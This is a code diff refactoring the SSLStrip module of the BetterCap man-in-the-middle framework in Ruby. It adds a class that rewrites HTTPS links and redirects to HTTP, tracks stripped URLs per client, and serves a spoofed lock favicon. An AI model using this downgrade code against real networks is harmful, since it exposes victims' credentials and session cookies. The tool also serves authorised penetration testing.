@@ -15,6 +15,38 @@ module BetterCap
 module Proxy
 module SSLStrip
 
+# Represent a stripped url associated to the client that requested it.
+class StrippedObject
+  attr_accessor :client
+  attr_accessor :original
+  attr_accessor :stripped
+
+  # Create an instance with the given arguments.
+  def initialize( client, original, stripped )
+    @client   = client
+    @original = original
+    @stripped = stripped
+  end
+
+  # Return a normalized version of +url+.
+  def self.normalize( url, schema = 'https' )
+    unless url.include?('://')
+      url = "#{schema}://#{url}"
+    end
+    unless url.end_with?('/')
+      url = "#{url}/"
+    end
+    url
+  end
+
+  # Downgrade +url+ from HTTPS to HTTP.
+  # Will take care of HSTS bypass urls in a near future.
+  def self.strip( url )
+    url.gsub( 'https://', 'http://' )
+  end
+
+end
+
 # Handle SSL stripping.
 class Strip
   # Maximum number of redirects to detect a HTTPS redirect loop.
@@ -24,9 +56,20 @@ class Strip
 
   # Create an instance of this object.
   def initialize
-    @urls    = URLMonitor.new
-    @cookies = CookieMonitor.new
-    @favicon = Response.from_file( File.dirname(__FILE__) + '/lock.ico', 'image/x-icon' )
+    @stripped = []
+    @cookies  = CookieMonitor.new
+    @favicon  = Response.from_file( File.dirname(__FILE__) + '/lock.ico', 'image/x-icon' )
+  end
+
+  # Return true if the +request+ was stripped.
+  def was_stripped?(request)
+    url = request.to_url(nil)
+    @stripped.each do |s|
+      if s.client == request.client and s.stripped == url
+        return true
+      end
+    end
+    false
   end
 
   # Check if the +request+ is a result of a stripped link/redirect and handle
@@ -86,18 +129,15 @@ class Strip
   # If the +request+ is a result of a sslstripping operation,
   # proxy it via SSL.
   def process_stripped!(request)
-    # check for stripped urls.
-    link = @urls.normalize( request.host )
-    if request.port == 80 and @urls.was_stripped?( request.client, link )
-      Logger.debug "[#{'SSLSTRIP'.green} #{request.client}] Found stripped HTTPS link '#{link}', proxying via SSL."
+    if request.port == 80 and was_stripped?(request)
+      Logger.debug "[#{'SSLSTRIP'.green} #{request.client}] Found stripped HTTPS link '#{request.to_url}', proxying via SSL."
       request.port = 443
     end
   end
 
   # If +request+ is the favicon of a stripped host, send our spoofed lock icon.
   def spoof_favicon!(request)
-    link = @urls.normalize( request.host )
-    if @urls.was_stripped?( request.client, link ) and is_favicon?(request)
+    if was_stripped?(request) and is_favicon?(request)
       Logger.info "[#{'SSLSTRIP'.green} #{request.client}] Sending spoofed favicon '#{request.to_url }'."
       return @favicon
     end
@@ -114,14 +154,16 @@ class Strip
   def process_redirection!(request,response)
     # check for a redirect
     if response['Location'].start_with?('https://')
-      link = @urls.normalize( response['Location'] )
-      Logger.info "[#{'SSLSTRIP'.green} #{request.client}] Found redirect to HTTPS '#{link}'."
-      @urls.add!( request.client, link )
+      original = StrippedObject.normalize( response['Location'] )
+      stripped = StrippedObject.strip( response['Location'] )
 
+      Logger.info "[#{'SSLSTRIP'.green} #{request.client}] Found redirect to HTTPS '#{original}'."
+
+      @stripped << StrippedObject.new( request.client, original, stripped )
       # The request will be retried on port 443 if MAX_REDIRECTS is not reached.
       request.port = 443
       # If MAX_REDIRECTS is reached, the 'Location' header will be used.
-      response['Location'] = @urls.downgrade( response['Location'] )
+      response['Location'] = stripped
 
       # retry the request if possible
       return true
@@ -136,10 +178,10 @@ class Strip
     begin
       response.body.scan( HTTPS_URL_RE ).uniq.each do |link|
         if link[0].include?('.')
-          link       = @urls.normalize( link[0] )
-          downgraded = @urls.downgrade( link )
+          link     = StrippedObject.normalize( link[0] )
+          stripped = StrippedObject.strip( link )
 
-          links << [link, downgraded]
+          links << [link, stripped]
         end
       end
     # handle errors due to binary content
@@ -149,9 +191,9 @@ class Strip
       Logger.info "[#{'SSLSTRIP'.green} #{request.client}] Stripping #{links.size} HTTPS link#{if links.size > 1 then 's' else '' end} inside '#{request.to_url}'."
 
       links.each do |l|
-        link, downgraded = l
-        @urls.add!( request.client, link )
-        response.body.gsub!( link, downgraded )
+        original, stripped = l
+        @stripped << StrippedObject.new( request.client, original, stripped )
+        response.body.gsub!( original, stripped )
       end
     end
   end
